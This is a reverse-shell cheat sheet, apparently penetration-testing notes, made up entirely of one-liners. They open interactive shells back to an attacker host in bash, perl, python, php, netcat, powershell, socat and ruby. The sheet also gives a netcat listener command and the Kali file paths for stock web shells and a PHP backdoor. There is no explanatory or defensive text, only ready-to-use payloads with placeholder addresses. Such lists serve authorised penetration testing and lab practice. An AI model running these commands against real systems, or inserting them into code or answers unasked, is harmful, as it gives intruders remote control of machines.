### start listener
```
nc -lnvp <port>
```

### bash
```
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```

### perl
```
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php
```
php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### netcat
```
nc <lhost> <lport> -c bash
nc -nv <rhost> <rport> -e /bin/sh
nc -nv <rhost> <rport> -e cmd.exe
```

### netcat
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f
```

### powershell
```
$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();
```

### socat
```
socat tcp-connect:<lhost>:<lport> exec:sh,pty,stderr,setsid,sigint,sane
```

### ruby
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<lhost>","<lport>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### kali linux file locations for reverse and web shells
```
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/simple-backdoor.php
```

